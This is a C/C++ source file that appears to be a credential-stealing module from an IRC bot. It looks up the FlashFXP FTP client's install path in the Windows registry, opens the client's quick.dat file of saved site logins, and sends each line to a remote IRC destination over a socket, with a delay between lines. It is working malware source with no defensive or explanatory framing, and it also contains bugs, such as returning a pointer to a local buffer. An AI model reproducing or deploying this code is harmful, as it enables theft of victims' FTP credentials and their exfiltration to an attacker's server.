#include "includes.h" 
#include "extern.h" 

char *_fipath() { 
   char _return[MAX_PATH]; 
   HKEY _hkey; 
   DWORD _siz = 128; 
   ::RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey); 
   { 
	   ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\FlashFXP\\3", 0, KEY_READ, &_hkey); 
	   ::RegQueryValueEx(_hkey, "Install Path", 0, NULL, (LPBYTE)_return, &_siz);      
   } 
   ::RegQueryValueEx(_hkey, "Install Path", 0, /*REG_SZ*/NULL, (LPBYTE)_return, &_siz); 
   ::RegCloseKey(_hkey); 
      return &_return[0]; 
} 

int FlashFXP(int parse, SOCKET sock, char *dest, BOOL notice) { 
   char buf[MAX_PATH], line[128]; 
   FILE *qd; 
   strcpy(buf, _fipath()); 
   if(!strcmp(buf, "NO_INSTALL")) return 0; 
   else strcat(buf, "\\quick.dat"); 
   qd = fopen(buf, "r"); 
   if(qd == NULL) return 0; 
   else { 
      if(!parse) { 
         fclose(qd); 
         return 1; 
      } 
      else { 
         while (fgets(line, 128, qd) != NULL) 
         { 
            irc_privmsg(sock, dest, line, notice); 
            Sleep(FLOOD_DELAY); 
         } 
         fclose(qd); 
         return 1; 
      } 
   } 
}